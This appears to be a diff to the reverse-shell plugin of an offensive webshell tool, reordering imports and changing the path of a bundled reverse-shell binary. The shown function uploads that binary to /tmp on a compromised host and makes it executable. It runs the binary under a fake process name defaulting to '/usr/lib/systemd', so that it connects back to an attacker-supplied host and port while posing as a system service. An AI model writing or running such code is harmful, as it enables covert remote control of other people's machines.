@@ -1,12 +1,10 @@
-from libs.reverse_client_bash import main as bind
-from libs.myapp import has_env
-# from base64 import b64encode
-from libs.c64 import encrypt
 from os import getcwd, path
 from threading import Thread
 
+from libs.c64 import encrypt
 from libs.config import alias, color
-from libs.myapp import delay_send, send, is_windows, get_system_code
+from libs.myapp import delay_send, get_system_code, has_env, is_windows, send
+from libs.reverse_client_bash import main as bind
 from webshell_plugins.upload import run as upload
 
 
@@ -57,7 +55,7 @@ def run(lhost: str, port: int, mode: int = 0, fakename: str = "/usr/lib/systemd"
     else:
         print(color.yellow(f"Use Mode 3->upload"))
         filename = encrypt(f"{lhost}-{port}")
-        if not upload(path.join(getcwd(), "libs", "reverse_server_light"), "/tmp/%s" % filename, True):
+        if not upload(path.join(getcwd(), "auxiliary", "reverse_server_light"), "/tmp/%s" % filename, True):
             return
         command = get_system_code(f"cd /tmp && chmod +x {filename} && ./{filename} {fakename}", False)
     t = Thread(target=delay_send, args=(2, command))
